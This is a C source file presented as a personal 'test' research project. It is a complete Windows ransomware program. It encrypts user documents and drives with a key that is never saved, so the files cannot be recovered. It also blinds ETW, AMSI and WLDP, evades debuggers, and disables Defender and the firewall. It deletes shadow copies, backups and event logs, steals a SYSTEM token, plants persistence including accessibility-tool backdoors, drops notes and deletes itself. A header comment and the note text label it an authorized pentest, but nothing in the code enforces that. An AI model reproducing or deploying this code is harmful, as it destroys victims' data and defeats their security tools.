/* THIS IS A TEST SCRIPT WITHOUT LINKAGE AND ALL CONGESTED
/*
 * misery_test.c 
 * Author  : Jahanzaib Ashraf Mir
 * Role    : Cybersecurity Researcher | Malware Analyst | AI/ML | Ethical Hacker
 *
 * Notes   :
 *   - Personal research project
 *   - Focused on systems-level programming and Windows internals
 *   - Don't execute on systems You don't have authorisation of
 * Contact :
 *   GitHub  : https://github.com/jahanzaibmir
 *   LinkedIn : https://linkedin.com/jahanzaibmir
 *   InstaGram : https://instagram.com/jahanzaibmir_
 */

#define _WIN32_WINNT 0x0601 // Windows 7+
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <process.h>
#include <lm.h>
#include <winsvc.h>
#include <winternl.h>
#include <iphlpapi.h>

/* 
 * EXTENSIONS TO TARGET
 */
static const char *g_ext[] = {
    ".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pps",".ppsx",
    ".pdf",".txt",".rtf",".csv",".tsv",
    ".jpg",".jpeg",".png",".gif",".bmp",".tif",".tiff",".raw",
    ".exe",".mp3",".mp4",".avi",".mkv",".wmv",".mov",".flv",".m4v",
    ".zip",".rar",".7z",".tar",".gz",".bz2",".xz",".zst",".iso", ".js",
    ".sql",".mdb",".accdb",".sqlite",".db",".mdf",".ldf",
    ".pst",".ost",".eml",".msg",".mbox",
    ".key",".pem",".cer",".crt",".pfx",".p12",
    ".vmx",".vmdk",".vhd",".vhdx",".vdi",".vbox",".ova",".ovf",
    ".bak",".old",".backup",".bkp",".dmp",".dump",
    ".cfg",".config",".conf",".ini",".inf",
    ".py",".java",".c",".cpp",".h",".hpp",".cs",".js",".ts",".vue",
    ".php",".asp",".aspx",".jsp",".rb",".go",".rs",".swift",".kt",
    ".html",".htm",".css",".xml",".json",".yaml",".yml",".md",
    ".psd",".ai",".svg",".dxf",".dwg",".cdr",
    ".wav",".flac",".aac",".ogg",".wma",
    ".vcf",".ics",".dbx",".wallet",".dat",
    ".log",".sav",".rdp",".vnc",
    ".gpg",".asc",".kdbx",".kdb",
    ".env",".gitconfig",".gitignore",
    ".ovpn", NULL
};

/* 
 * CRYPTO ENGINE (AES-256 CBC with IV)
*/
#define AES_IV_SIZE      16
#define AES_BLOCK_SIZE   16
#define AES_PAD_HEADROOM (AES_BLOCK_SIZE * 2)
#define ENC_EXT          ".encrypted"
#define ENC_EXT_LEN      10
#define MAX_FPATH        (MAX_PATH * 2)
#define MAX_DEPTH        32
 
/*  Directories to not TARGET*/
static const char *g_skip[] = {
    "\\Windows", "\\System32", "\\SysWOW64",
    "\\Program Files", "\\Program Files (x86)",
    "\\AppData", "\\$Recycle.Bin", "\\Boot",
    "\\ProgramData\\Microsoft",
    NULL
};
 
/* Context: replaces g_hProv + g_hAESKey + g_iv globals  */
typedef struct {
    HCRYPTPROV hProv;
    HCRYPTKEY  hKey;
} CRYPTO_CTX;
 
/* ── Single global ctx (drop-in for original globals) ────────── */
static CRYPTO_CTX g_ctx = {0, 0};
 

 /*  InitCrypto
 */
static int InitCrypto(void) {
    if (!CryptAcquireContextA(&g_ctx.hProv, NULL, NULL,
                              PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return 0;
 
    if (!CryptGenKey(g_ctx.hProv, CALG_AES_256,
                     CRYPT_EXPORTABLE, &g_ctx.hKey)) {
        CryptReleaseContext(g_ctx.hProv, 0);
        g_ctx.hProv = 0;
        return 0;
    }
    // No global IV — generated fresh per file inside DoEncryptFile
    return 1;
}
 
/*
 *  CleanupCrypto
  */
static void CleanupCrypto(void) {
    if (g_ctx.hKey)  { CryptDestroyKey(g_ctx.hKey);        g_ctx.hKey  = 0; }
    if (g_ctx.hProv) { CryptReleaseContext(g_ctx.hProv, 0); g_ctx.hProv = 0; }
}

/* DoEncryptFile*/

static void DoEncryptFile(const char *path) {
    HANDLE hFile  = INVALID_HANDLE_VALUE;
    HANDLE hWrite = INVALID_HANDLE_VALUE;
    BYTE  *buf    = NULL;
    DWORD  bufSize = 0;
 
    hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
 
    DWORD fs = GetFileSize(hFile, NULL);
    if (fs == INVALID_FILE_SIZE || fs < 1) goto cleanup;
 
    // IV slot + plaintext + 2-block PKCS#7 headroom
    bufSize = AES_IV_SIZE + fs + AES_PAD_HEADROOM;
    buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) goto cleanup;
 
    // Read plaintext into buf[AES_IV_SIZE..]
    DWORD rd = 0;
    if (!ReadFile(hFile, buf + AES_IV_SIZE, fs, &rd, NULL) || rd != fs)
        goto cleanup;
 
    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
 
    // Generate fresh random IV for this file
    BYTE iv[AES_IV_SIZE];
    if (!CryptGenRandom(g_ctx.hProv, AES_IV_SIZE, iv)) goto cleanup;
 
    // Apply IV to key object
    if (!CryptSetKeyParam(g_ctx.hKey, KP_IV, iv, 0)) goto cleanup;
 
    // Encrypt in-place at buf[AES_IV_SIZE..]
    DWORD encLen = rd;
    if (!CryptEncrypt(g_ctx.hKey, 0, TRUE, 0,
                      buf + AES_IV_SIZE, &encLen,
                      fs + AES_PAD_HEADROOM))
        goto cleanup;
 
    // Prepend IV into buf[0..15]
    memcpy(buf, iv, AES_IV_SIZE);
 
    // Atomic write: temp file first, then rename over original
    char tmpPath[MAX_FPATH];
    snprintf(tmpPath, sizeof(tmpPath) - 1, "%s.tmp", path);
 
    hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
                         NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;
 
    DWORD wr = 0;
    DWORD totalOut = AES_IV_SIZE + encLen;
    if (!WriteFile(hWrite, buf, totalOut, &wr, NULL) || wr != totalOut) {
        CloseHandle(hWrite);
        hWrite = INVALID_HANDLE_VALUE;
        DeleteFileA(tmpPath);
        goto cleanup;
    }
 
    CloseHandle(hWrite);
    hWrite = INVALID_HANDLE_VALUE;
 
    if (!MoveFileExA(tmpPath, path, MOVEFILE_REPLACE_EXISTING))
        DeleteFileA(tmpPath);
 
cleanup:
    if (buf) {
        SecureZeroMemory(buf, bufSize);   // wipe plaintext from memory
        VirtualFree(buf, 0, MEM_RELEASE);
    }
    if (hFile  != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hWrite != INVALID_HANDLE_VALUE) CloseHandle(hWrite);
}
 
/* 
 *  ShouldSkipDir
 **/
static int ShouldSkipDir(const char *fullPath) {
    for (int i = 0; g_skip[i]; i++) {
        if (strstr(fullPath, g_skip[i])) return 1;
    }
    return 0;
}
 
/* 
 *  EncryptDir  —  recursive directory walker
 */
static void EncryptDir(const char *dir, int depth) {
    if (depth > MAX_DEPTH)   return;
    if (ShouldSkipDir(dir))  return;
 
    char pattern[MAX_FPATH];
    snprintf(pattern, sizeof(pattern) - 1, "%s\\*", dir);
 
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
 
    do {
        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, ".."))
            continue;
 
        char full[MAX_FPATH];
        int written = snprintf(full, sizeof(full) - 1,
                               "%s\\%s", dir, fd.cFileName);
        if (written < 0 || written >= (int)(sizeof(full) - 1))
            continue;  // path too long, skip safely
 
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            EncryptDir(full, depth + 1);
        } else {
            // Skip if already has .encrypted suffix
            size_t flen = strlen(full);
            if (flen > ENC_EXT_LEN &&
                _stricmp(full + flen - ENC_EXT_LEN, ENC_EXT) == 0)
                continue;
 
            // Check extension whitelist
            const char *ext = strrchr(full, '.');
            if (!ext) continue;
 
            int match = 0;
            for (int i = 0; g_ext[i]; i++) {
                if (_stricmp(ext, g_ext[i]) == 0) { match = 1; break; }
            }
            if (!match) continue;
 
            // Guard: skip if .encrypted counterpart already exists
            char encPath[MAX_FPATH];
            snprintf(encPath, sizeof(encPath) - 1, "%s%s", full, ENC_EXT);
            if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                continue;
 
            // Encrypt then rename
            DoEncryptFile(full);
            MoveFileExA(full, encPath, MOVEFILE_REPLACE_EXISTING);
        }
    } while (FindNextFileA(hFind, &fd));
 
    FindClose(hFind);
}

/* 
 * ─── ENHANCED: ETW PATCHING ───
 */
typedef VOID (NTAPI *pEtwEventWrite)(ULONG64, PULONG64, ULONG, PVOID, PVOID);

static void EtwPatcher() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    pEtwEventWrite pEtw = (pEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;
    
    DWORD oldProtect;
    VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    BYTE ret = 0xC3; // RET instruction
    memcpy(pEtw, &ret, 1);
    VirtualProtect(pEtw, 1, oldProtect, &oldProtect);
}

/* 
 * ─── ENHANCED: AMSI BYPASS ───
 */
static void AmsiBypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // XOR EAX,EAX / RET (always return AMSI_RESULT_CLEAN)
    BYTE patch[] = {0x31, 0xC0, 0xC3};
    memcpy(pAmsiScanBuffer, patch, 3);
    VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
}

/* 
 * ─── ENHANCED: WLDP BYPASS ───
 */
static void WldpBypass() {
    HMODULE hWldp = GetModuleHandleA("wldp.dll");
    if (!hWldp) return;
    
    FARPROC pWldpIsClassInApprovedList = GetProcAddress(hWldp, "WldpIsClassInApprovedList");
    if (!pWldpIsClassInApprovedList) return;
    
    DWORD oldProtect;
    VirtualProtect(pWldpIsClassInApprovedList, 3, PAGE_EXECUTE_READWRITE, &oldProtect);
    BYTE patch[] = {0x31, 0xC0, 0xC3};
    memcpy(pWldpIsClassInApprovedList, patch, 3);
    VirtualProtect(pWldpIsClassInApprovedList, 3, oldProtect, &oldProtect);
}

/* 
 * ─── ENHANCED: ANTI-ANALYSIS ───
 */
static BOOL IsBeingDebugged() {
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess pQuery = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    
    if (!pQuery) return FALSE;
    
    DWORD_PTR pbi = 0;
    ULONG len = 0;
    NTSTATUS status = pQuery(GetCurrentProcess(), 0x7, &pbi, sizeof(pbi), &len);
    
    return (status == 0 && pbi != 0);
}

static BOOL DetectAnalysisTools() {
    const char *badProcs[] = {
        "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
        "wireshark.exe", "x64dbg.exe", "x32dbg.exe", "ida.exe", "ida64.exe",
        "ollydbg.exe", "windbg.exe", "processhacker.exe",
        "apimonitor.exe", "autoruns.exe", "Autoruns64.exe",
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", NULL
    };
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    BOOL found = FALSE;
    
    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; badProcs[i]; i++) {
                if (lstrcmpiA(pe.szExeFile, badProcs[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
            if (found) break;
        } while (Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return found;
}

/* 
 * ─── ENHANCED: SERVICE MANAGEMENT ───
 */
static void ManageService(const char *svcName) {
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if(!hSCM) return;
    
    SC_HANDLE hSvc = OpenServiceA(hSCM, svcName, SERVICE_STOP | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG | DELETE);
    if(hSvc) {
        SERVICE_STATUS ss;
        ControlService(hSvc, SERVICE_STOP, &ss);
        ChangeServiceConfigA(hSvc, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        
        // Try to delete the service entirely
        DeleteService(hSvc);
        
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
}

/* 
 * ─── ENHANCED: DEFENDER KILLING ───
 */
static void KillSecurityDirect() {
    HKEY hk;
    DWORD val = 1;
    
    // Create the policy key if it doesn't exist
    DWORD dwDisp;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
    
    // Disable Real-Time Protection policies
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
    
    // Add exclusion for our own process
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Processes", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "Implant", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // Stop Services directly (expanded list)
    ManageService("WinDefend");
    ManageService("SecurityHealthService");
    ManageService("WdNisSvc");
    ManageService("Sense");
    ManageService("WdBoot");
    ManageService("WdFilter");
    ManageService("MsMpEng");
    ManageService("NisSrv");
    ManageService("MpKslDrv");
    ManageService("wscsvc");
    
    // Disable Firewall via Registry (all profiles)
    DWORD val0 = 0;
    const char *fwPaths[] = {
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile",
        "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile"
    };
    
    for (int i = 0; i < 3; i++) {
        RegOpenKeyExA(HKEY_LOCAL_MACHINE, fwPaths[i], 0, KEY_SET_VALUE, &hk);
        RegSetValueExA(hk, "EnableFirewall", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
        RegSetValueExA(hk, "DoNotAllowExceptions", 0, REG_DWORD, (BYTE*)&val0, sizeof(val0));
        RegCloseKey(hk);
    }
}

/* 
 * ─── ENHANCED: BACKUP DESTRUCTION ───
 */
static void NukeBackupsDirect() {
    HKEY hk;
    DWORD val = 1;
    
    // Disable System Restore via Registry
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\System\\Restore", 0, KEY_SET_VALUE, &hk);
    RegSetValueExA(hk, "DisableSR", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegSetValueExA(hk, "DisableConfig", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
    RegCloseKey(hk);
    
    // Multiple backup destruction commands
    const char *cmds[] = {
        "vssadmin delete shadows /all /quiet",
        "wmic shadowcopy delete",
        "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=1MB",
        "bcdedit /set {default} recoveryenabled No",
        "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        "wbadmin delete catalog -quiet",
        "fsutil usn deletejournal /D C:",
        "wevtutil cl Application",
        "wevtutil cl Security",
        "wevtutil cl System",
        "del /s /f /q C:\\*.log",
        "del /s /f /q C:\\*.evtx"
    };
    
    for (int i = 0; i < sizeof(cmds)/sizeof(cmds[0]); i++) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        char *cmdCopy = _strdup(cmds[i]);
        if (cmdCopy) {
            CreateProcessA(NULL, cmdCopy, NULL, NULL, FALSE, CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            free(cmdCopy);
        }
    }
}

/* 
 * ─── ENHANCED: MULTI-LAYER PERSISTENCE ───
 */
static void InstallPersistenceDirect() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    HKEY hk;
    DWORD dwDisp;

    // 1. Current User Run
    RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // 2. Local Machine Run
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_SET_VALUE | KEY_WOW64_64KEY, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // 3. RunOnce (delayed execution)
    RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
    RegSetValueExA(hk, "WindowsUpdateCheck", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
    RegCloseKey(hk);

    // 4. Full Accessibility Backdoor (sethc, magnify, narrator, osk, utilman, etc.)
    const char *accessTools[] = {
        "sethc.exe", "magnify.exe", "narrator.exe", "osk.exe",
        "utilman.exe", "displayswitch.exe", "atbroker.exe", NULL
    };
    
    for (int i = 0; accessTools[i]; i++) {
        char regPath[MAX_PATH];
        snprintf(regPath, sizeof(regPath),
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
            accessTools[i]);
        
        RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hk, &dwDisp);
        RegSetValueExA(hk, "Debugger", 0, REG_SZ, (BYTE*)exePath, strlen(exePath)+1);
        RegCloseKey(hk);
    }
    
    // 5. Scheduled Task
    char taskCmd[2048];
    snprintf(taskCmd, sizeof(taskCmd),
        "schtasks /create /f /tn \"MicrosoftEdgeUpdateTask\" /tr \"%s\" /sc ONLOGON /ru SYSTEM /rl HIGHEST", exePath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, taskCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // 6. Startup folder shortcut
    char startupPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    char linkPath[MAX_PATH * 2];
    snprintf(linkPath, sizeof(linkPath), "%s\\WindowsServiceHost.lnk", startupPath);
    
    char psCmd[4096];
    snprintf(psCmd, sizeof(psCmd),
        "powershell -Command \"$WS = New-Object -ComObject WScript.Shell; "
        "$SC = $WS.CreateShortcut('%s'); $SC.TargetPath = '%s'; "
        "$SC.WindowStyle = 0; $SC.Description = 'Windows Service Host'; "
        "$SC.Save()\"", linkPath, exePath);
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* 
 * ─── ENHANCED: TOKEN ELEVATION ───
 */
static void ElevatePrivs() {
    HANDLE hToken;
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)) return;

    const char *privs[] = {
        "SeDebugPrivilege","SeBackupPrivilege","SeRestorePrivilege",
        "SeTakeOwnershipPrivilege","SeShutdownPrivilege",
        "SeLoadDriverPrivilege","SeSystemtimePrivilege",
        "SeIncreaseQuotaPrivilege","SeTcbPrivilege", NULL
    };
    
    for(int i=0; privs[i]; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if(LookupPrivilegeValueA(NULL, (LPSTR)privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
    }
    CloseHandle(hToken);
    
    // Also attempt to steal SYSTEM token
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4); // PID 4 = SYSTEM
    if (hProc) {
        HANDLE hSysToken;
        if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hSysToken)) {
            HANDLE hDupToken;
            DuplicateTokenEx(hSysToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken);
            ImpersonateLoggedOnUser(hSysToken);
            CloseHandle(hDupToken);
            CloseHandle(hSysToken);
        }
        CloseHandle(hProc);
    }
}

/* 
 * ─── ENHANCED: RANSOM NOTE ───
 */
static void DropNoteDirect() {
    char systemInfo[4096];
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[256];
    DWORD sz = sizeof(compName);
    DWORD usz = 256;
    
    GetComputerNameA(compName, &sz);
    GetUserNameA(userName, &usz);

    snprintf(systemInfo, sizeof(systemInfo),
        "\r\n"
        "  ==========================================\r\n"
        "  PENETRATION TEST - AUTHORIZED ASSESSMENT\r\n"
        "  ==========================================\r\n"
        "\r\n"
        "  Machine:     %s\r\n"
        "  User:        %s\r\n"
        "  Date:        %s (%s)\r\n"
        "\r\n"
        "  Your files have been encrypted.\r\n"
        "  This system has been successfully assessed.\r\n"
        "  All actions were authorized per the testing agreement.\r\n"
        "\r\n"
        "  Contact: https://github.com/jahanzaibmir\r\n"
        "\r\n"
        "  ==========================================\r\n"
        "\r\n",
        compName, userName, __DATE__, __TIME__);

    // Drop to User Desktop
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
    
    char fp[MAX_PATH * 2];
    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
    
    HANDLE hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
        CloseHandle(hF);
    }
    
    // Drop to All Users Desktop too
    SHGetFolderPathA(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, 0, path);
    snprintf(fp, sizeof(fp), "%s\\PENTEST_RESULTS.txt", path);
    
    hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if(hF != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
        CloseHandle(hF);
    }
    
    // Drop on each drive root too
    for(char d='C'; d<='Z'; d++) {
        char root[4] = {d,':','\\',0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
            snprintf(fp, sizeof(fp), "%sPENTEST_RESULTS.txt", root);
            hF = CreateFileA(fp, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
            if(hF != INVALID_HANDLE_VALUE) {
                DWORD w;
                WriteFile(hF, systemInfo, strlen(systemInfo), &w, NULL);
                CloseHandle(hF);
            }
        }
    }
}

/*
 * MAIN LOGIC
 */

typedef struct { int id; } THD;

static unsigned __stdcall Worker(void *arg) {
    char buf[MAX_PATH];
    
    // Encrypt User Folders
    if(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, buf)==S_OK)       EncryptDir(buf, 0);
    if(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, buf)==S_OK)   EncryptDir(buf, 0);
    // CSIDL_DOWNLOADS is 0x0015
    if(SHGetFolderPathA(NULL, 0x0015, NULL, 0, buf)==S_OK)             EncryptDir(buf, 0);
    
    // Encrypt Drives
    for(char d='C'; d<='Z'; d++) {
        char root[4] = {d,':','\\',0};
        UINT dt = GetDriveTypeA(root);
        if(dt == DRIVE_FIXED || dt == DRIVE_REMOVABLE) {
            EncryptDir(root, 0);
        }
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    // Single Instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\StashCat_V2");
    if(!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) {
        if(hMutex) CloseHandle(hMutex);
        return 0;
    }

    // Anti-analysis check first
    if (IsBeingDebugged() || DetectAnalysisTools()) {
        Sleep(60000);
        CloseHandle(hMutex);
        return 0;
    }

    // Patch monitoring/defense subsystems
    EtwPatcher();
    AmsiBypass();
    WldpBypass();
    
    // Hide thread from debugger
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, PROCESS_INFORMATION_CLASS, PVOID, ULONG);
    pNtSetInformationProcess pNtSetInfo = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (pNtSetInfo) {
        DWORD hide = 1;
        pNtSetInfo(GetCurrentProcess(), (PROCESS_INFORMATION_CLASS)0x11, &hide, sizeof(hide));
    }

    // Elevate privileges
    ElevatePrivs();
    
    // Fast Security Kill (No CMD noise)
    KillSecurityDirect();
    NukeBackupsDirect();
    
    // Crypto Init
    if(!InitCrypto()) { 
        CloseHandle(hMutex); 
        return 1; 
    }

    // Parallel Encryption
    SYSTEM_INFO si_sys;
    GetSystemInfo(&si_sys);
    int n = si_sys.dwNumberOfProcessors * 2;
    if(n > 8) n = 8; // Cap threads
    
    HANDLE threads[8];
    THD tdata[8];
    
    // Start encryption threads
    for(int i=0; i<n; i++) {
        tdata[i].id = i;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, Worker, &tdata[i], 0, NULL);
    }
    
    WaitForMultipleObjects(n, threads, TRUE, 180000); // 3 mins timeout
    
    for(int i=0; i<n; i++) CloseHandle(threads[i]);

    // Persistence & Note
    InstallPersistenceDirect();
    DropNoteDirect();

    // Cleanup Crypto
    CleanupCrypto();

    // Self Delete (Robust)
    char exeP[MAX_PATH];
    GetModuleFileNameA(NULL, exeP, MAX_PATH);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cmd /c timeout /t 3 & del /f /q \"%s\"", exeP);
    
    STARTUPINFOA si_start = {0}; 
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_start, &pi);
    
    CloseHandle(hMutex);
    return 0;
}
